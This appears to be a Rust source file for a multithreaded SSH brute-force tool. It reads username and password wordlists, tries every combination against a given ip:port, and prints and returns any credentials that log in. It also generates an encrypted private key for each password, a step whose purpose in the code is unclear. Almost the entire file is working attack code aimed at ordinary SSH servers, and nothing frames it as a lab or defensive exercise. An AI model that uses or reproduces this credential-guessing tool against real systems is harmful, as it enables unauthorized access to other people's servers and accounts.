use clap::Parser;
use osshkeys::{KeyPair, cipher::Cipher, KeyType};
use ssh_rs::ssh;
use console::style;
use types::*;
use crossbeam::channel::{Sender, Receiver, unbounded};
use std::{
  thread,
  thread::JoinHandle, time::Duration,
};

#[derive(Debug, Clone, Parser)]
#[clap(author, version, about)]
pub struct Arguments {
  #[clap(value_parser)]
  /// <ipaddress>:<port>
  pub ip_port: String,
  
  #[clap(value_parser)]
  /// The username list.
  pub usr_wordlist: String,
  
  #[clap(value_parser)]
  /// The password list.
  pub pwr_wordlist: String,

  /// File to write the private keys
  #[clap(short, long)]
  pub output: Option<String>,

  #[clap(short, long, value_enum)]
  /// The type of private key o create.
  pub key_type: Option<ArgKeyType>,

  #[clap(long, default_value_if("debug", Some("false"), Some("true")), min_values(0))]
  /// Debug messages
  pub debug: Option<bool>,

  #[clap(short, long)]
  /// The number of thread.
  pub threads: Option<u64>,

  #[clap(short, long, value_enum)]
  /// The cupher to encrypt the key.
  pub cipher: Option<ArgCipher>,

  #[clap(short, long)]
  /// The number passes to encrypt the private key.
  pub bits: Option<usize>,
}

impl Arguments {

  // Get the name of the file without the full / relative path.
  #[allow(dead_code)]
  pub fn get_file_name(filename: String) -> String {
    let mut split: Vec<&str> = filename.split("\\").collect();

    if split.len() > 1 {
      return String::from(split[split.len()-1]);
    }

    split = filename.split("/").collect();
    if split.len() > 1 {
      return String::from(split[split.len()-1]);
    }

    return filename;
  }

  #[allow(dead_code)]
  // Works out whether each line uses \r\n or \n.
  pub fn get_line_ending(file_contents: String) -> LineEndings {
    let mut out = LineEndings::CRLR;
    
    let mut content: Vec<&str> = file_contents.split(LF).collect();
    if content.len() > 1 {
      out = LineEndings::LR;
    }

    content = file_contents.split(CRLF).collect();
    if content.len() > 1 {
      out = LineEndings::CRLR;
    }

    out
  }

  #[allow(dead_code)]
  // Reads a file into a string.
  pub fn read_wordlist(filename: &str) -> std::io::Result<String> {
    let file =  std::fs::read_to_string(filename)?;

    if file.len() < 1 {
      println!("{}: failed to read to [{}] or file is empty",
      style("Error").red().bright(), style(filename).cyan());

      std::process::exit(1);
    }

    Ok(file)
  }

  /**Function brute forces ssh users by generating the corresponding private keys via a username and password file
   * Params:
   *  usr_ln:       LineEndings {Determines how to separate each line in the file}
   *  pwr_ln:       LineEndings {Determines how to separate each line in the file}
   *  usr_content:  String      {The username file as a string}
   *  pwr_content:  String      {The password file as a string}
   * Returns KeyOutput
   */
  pub fn populate_output_buffer(&self, usr_ln: LineEndings, pwr_ln: LineEndings, usr_content: String, pwr_content: String) -> KeyOutput {
    let mut bits: usize = 3072;
    let mut threads: u64 = 1;
    let mut cipher = Cipher::Aes256_Ctr;
    let mut algo = KeyType::RSA;
    let mut ip = self.ip_port.clone();

    let user_filename = Self::get_file_name(self.usr_wordlist.clone());
    let pass_filename = Self::get_file_name(self.pwr_wordlist.clone());
    let mut u_ln = CRLF;
    let mut p_ln = CRLF;
    let mut out = KeyOutput::default();

    match usr_ln {
      LineEndings::LR => { u_ln = LF; }
      _ => {}
    }

    match pwr_ln {
      LineEndings::LR => { p_ln = LF; }
      _ => {}
    }

    if let Some(b) = self.bits {
      bits = b;
    }

    if let Some(t) = self.threads {
      threads = t;
    }

    if let Some(c) = self.cipher.clone() {
      cipher = Self::get_cipher(c);
    }

    if let Some(k) = self.key_type.clone() {
      algo = Self::get_key_type(k);
    }

    if threads < 2 {

      // Splits users and passwords into separate lines.
      let users: Vec<&str> = usr_content.split(u_ln).collect();
      let passwords: Vec<&str> = pwr_content.split(p_ln).collect();
  
      for i in users {
        // Enumerate each user.

        for idx in passwords.clone() {
          
          // Generate a private key for the password
          let mut key = String::from("");
          if let Ok(k) = Self::encrypt_pass_to_key(idx, bits, algo) {
            key = k;
          }
          
          // Connect to the server.
          let ckey = key.clone();
          let session = ssh::create_session()
          .username(i)
          .password(idx)
          .private_key(key)
          .connect(ip.clone());

          match session {

            // Populate the output buffer with data.
            Ok(s) => {
              println!(
                "{}: {} with {}@{} with '{}'",
               style("OK").yellow().bright(), style("Successfully connected").green().bright(),
               style(ip.clone()).cyan(), style(i).cyan(), style(idx).cyan()
              );

              s.close();
              out.algorithim = format!("{:#?}", algo);
              out.bits = bits;
              out.cipher = format!("{:#?}", cipher);
              out.time = String::from("None for now");
              out.usr_wordlist = user_filename;
              out.pwr_wordlist = pass_filename;
              out.ip = ip.clone();
              out.data.user = String::from(i);
              out.data.password = String::from(idx);
              out.data.private_key = ckey;

              return out;
            },

            // Handle the error.
            Err(e) => {
              println!("{}: usr: {}@{} pwr: '{}' - {}", 
              style("Error").red().bright(), style(ip.clone()).cyan(), style(i).cyan(),
              style(idx).cyan(), e.kind());
            }
          }
        }
      }
    }

    else {
      
      let users: Vec<&str> = usr_content.split(u_ln).collect();
      let passwords: Vec<&str> = pwr_content.split(p_ln).collect();
      let mut userpass: Vec<String> = Default::default();
      let key_info = KeyInfo { bits: bits.clone(), algo: algo.clone(), ip: ip.clone() };

      for i in users {
        for idx in passwords.clone() {
          userpass.push(format!("{i}:{idx}"));
        }
      }

      let items = userpass.len();
      let thread_chunk_sz = items/threads as usize;
      let remainder = items as f64 % threads as f64;
      let mut handles: Vec<JoinHandle<()>> = Default::default();

      println!("items: {}\nthread_chunk_size: {}\nremainder: {}\n {threads}",
      style(items).cyan(), style(thread_chunk_sz).cyan(), style(remainder).cyan());
    
      let (tx_msg, rx_msg) = unbounded::<ThreadMessage>();
      let (tx_out, rx_out) = unbounded::<KeyOutput>();
      let mut th_data_ch: Vec<String> = Default::default();
      let mut ch_counter: usize = 0;
      
      for i in 0..userpass.len()+1 {
        let th_msg_sender = tx_msg.clone();
        let th_out_sender = tx_out.clone();
        let th_key_info = key_info.clone();

        let cip = self.ip_port.clone();
        let cusr_filename = user_filename.clone();
        let cpwr_filename = pass_filename.clone();

        if ch_counter+1 > thread_chunk_sz {
          let c_data = th_data_ch.clone();
          
          // Brute force private key login.
          // Call thread function and userpass chunk to thread.
          handles.push(thread::spawn(move || {
            let th_msg_s = th_msg_sender.clone();
            let th_out_s = th_out_sender.clone();
            let th_data_chk = c_data.len();
            let th_ip = cip.clone();
            println!("thread_chunk {th_data_chk}\nthread_chk_data: {:?}", c_data);

            if let Some(buffer) = Self::thread_populate_buffer(th_msg_s.clone(), c_data, &th_key_info) {
              let output = KeyOutput {
                algorithim: format!("{:?}", algo),
                bits: bits.clone(),
                cipher: format!("{:?}", cipher),
                ip: th_ip,
                pwr_wordlist: cpwr_filename,
                usr_wordlist: cusr_filename,
                time: String::from("None for now"),
                data: buffer,
              };

              match th_msg_s.send(ThreadMessage::Data) {
                Ok(_) => {
                  if let Err(e) = th_out_s.send(output) {
                    println!("{}: unable to send keydata to main thread - {}", style("Error").red().bright(), style(e).cyan());
                  }

                  else {
                    println!("{}: Successfully sent keydata to main thread", style("OK").yellow().bright());
                  }
                },

                Err(e) => {}
              }
            }
          }));
          
          ch_counter = 0;
          th_data_ch.clear();
        }

        if let Some(index) = userpass.get(i) {
          th_data_ch.push(index.to_string());
        }

        ch_counter += 1;
      }

      let mut handle_count: usize = 1;
      std::thread::sleep(Duration::from_millis(500));
      let mut wait_counter: usize = 0;

      loop {
        if wait_counter >= 10 {
          break;
        }
        
        let crx_msg = rx_msg.clone();
        let crx_out = rx_out.clone();

        if let Ok(v) = crx_msg.recv() {
          
          match v {
            ThreadMessage::Data => {
              println!("{} => Ready to receive key", style("Debug").red().bright());

              if let Ok(s) = crx_out.recv() {
                println!("{}: keydata received", style("OK").yellow().bright());
                out = s;
              }
            }

            ThreadMessage::Waiting => {}
          }
        }

        else {
          println!("wait_counter: {wait_counter}");
          wait_counter += 1;
          thread::sleep(Duration::from_millis(500));
        }
      }
      
      for i in handles {
        if let Ok(handle) = i.join() {
          println!("handles joined: {handle_count}");
          handle_count += 1;
        }
      }
    }

    out
  }

  pub fn thread_populate_buffer(s_msg: Sender<ThreadMessage>, data: Vec<String>, info: &KeyInfo) -> Option<PrivateKeyData> {
    let c_data = data.clone();
    let key_type = info.algo;
    let bits = info.bits;
    let ip = String::from(info.ip.as_str());

    for i in c_data {
      let pair: Vec<&str> = i.split(":").collect();
      let username = pair[0];
      let password = pair[1];
      let mut key = String::from("");

      if let Ok(k) = Self::encrypt_pass_to_key(password, bits, key_type) {
        key.push_str(k.as_str());
      }

      let session = ssh::create_session()
      .username(username).password(password).private_key(key.clone()).connect(ip.clone());

      match session {
        Ok(s) => {
          s.close();

          println!("{}: {} {}@{} with password '{}'",
          style("OK").yellow().bright(), style("Successfully connected").green().bright(),
          style(username.clone()).cyan(), style(ip.clone()).cyan(), style(password.clone()).cyan());
          
          return Some(PrivateKeyData {
            user: String::from(username),
            password: String::from(password),
            private_key: key,
          });
        },

        Err(e) => {
          // debug messages go here --->

          if let Err(e) = s_msg.send(ThreadMessage::Waiting) {

          }
        }
      }
    }

    None
  }

  // Write the FileInputOutput buffer content to a json file.
  #[allow(dead_code)]
  pub fn write_output(&self, content: KeyOutput) -> () {
    
    match serde_json::to_string_pretty(&content) {
      Ok(s) => {
        println!("{s}");
      },
      Err(_) => {}
    }
  }

  /**Function creates a d private key in the openssh format
   * Params:
   *  text: &str        {Passphrase to encrypt}
   *  bits: u32         {The bits / passes to encrypt the key}
   *  key:  KeyType     {The type of algorithim to use}
   * Returns String
   */
  #[allow(dead_code)]
  pub fn encrypt_pass_to_key(text: &str, bits: usize, key: osshkeys::KeyType) -> std::result::Result<String, osshkeys::error::Error> {
    let pair = KeyPair::generate(key, bits)?;
    let key = pair.serialize_openssh(Some(text), Cipher::Aes256_Ctr)?.replace("\n", "");

    Ok(key)
  }

  /**function parses the input specified by the user and assigns it to the corresponding key algorithim type
   * Params:
   *  key_type: ArgKeyType {The key algorithim}
   * Returns KeyType
   */
  #[allow(dead_code)]
  pub fn get_key_type(key_type: ArgKeyType) -> osshkeys::KeyType {
    let mut out = osshkeys::KeyType::RSA;

    match key_type {
      ArgKeyType::Dsa =>     { out = KeyType::DSA }
      ArgKeyType::Ecdsa =>   { out = KeyType::ECDSA }
      ArgKeyType::Ed25519 => { out = KeyType::ED25519 }
      ArgKeyType::Rsa =>     { out = KeyType::RSA }
    }

    out
  }

  /**Function parses the users input and assigns it to the corresponding cipher.
   * Params:
   *  cipher: ArgCipher {The cipher to use}
   * Returns Cipher
   */
  #[allow(dead_code)]
  pub fn get_cipher(cipher: ArgCipher) -> Cipher {
    let mut out = Cipher::Aes128_Cbc;

    match cipher {
      ArgCipher::Aes128Cbc => { out = Cipher::Aes128_Cbc }
      ArgCipher::Aes128Ctr => { out = Cipher::Aes128_Ctr }
      ArgCipher::Aes192Cbc => { out = Cipher::Aes192_Cbc }
      ArgCipher::Aes192Ctr => { out = Cipher::Aes192_Ctr }
      ArgCipher::Aes256Cbc => { out = Cipher::Aes256_Cbc }
      ArgCipher::Aes256Ctr => { out = Cipher::Aes256_Ctr }
    }

    out
  }

}

pub mod types {
  use osshkeys::{cipher::Cipher, KeyType};
  use serde::Serialize;
  use clap;

  pub const LF: &str = "\n";
  pub const CRLF: &str = "\r\n";  

  #[derive(Debug, Clone)]
  pub struct KeyInfo {
    pub ip: String,
    pub bits: usize,
    pub algo: KeyType
  }
  
  #[derive(Debug, Clone)]
  pub enum LineEndings {
    LR,
    CRLR,
  }

  #[derive(Debug, Clone, clap::ValueEnum)]
  pub enum ArgKeyType {
    Rsa,
    Dsa,
    Ecdsa,
    Ed25519,
  }
  
  #[derive(Debug, Clone)]
  pub enum ThreadMessage {
    Data,
    Waiting,
  }
  
  #[derive(Debug, Clone, clap::ValueEnum)]
  pub enum ArgCipher {
    Aes128Cbc,
    Aes128Ctr,
    Aes192Cbc,
    Aes192Ctr,
    Aes256Cbc,
    Aes256Ctr,
  }
  
  #[derive(Debug, Clone, Serialize, Default)]
  pub struct KeyOutput {
    pub ip: String,
    pub data: PrivateKeyData,
    pub bits: usize,
    pub cipher: String,
    pub algorithim: String,
    pub usr_wordlist: String,
    pub pwr_wordlist: String,
    pub time: String,
  }
  
  #[derive(Debug, Clone, Default, Serialize)]
  pub struct PrivateKeyData {
    pub user: String,
    pub password: String,
    pub private_key: String,
  }
}



// pub fn parse_response(response: String) -> FileJsonOutput {
//   // Deserialize the json object in another thread.
//   let (tx, rx) = std::sync::mpsc::channel::<FileJsonOutput>();
//   std::thread::spawn(Box::new(move || {
//     match serde_json::from_str::<FileJsonOutput>(&response) {
//       Ok(s) => {

//         // Send the results back to the main thread.
//         match tx.send(s) {
//           Ok(_) => {},
//           Err(e) => {
//             println!("{e}");
//           }
//         }
//       },
//       Err(e) => {
//         println!("{e}");
//       }
//     }
//   }));

//   // Receives the data.
//   let mut output_data = FileJsonOutput::default();
//   match rx.recv() {
//     Ok(s) => {
//       output_data = s;
//     },
//     Err(_) => {}
//   }

//   output_data
// }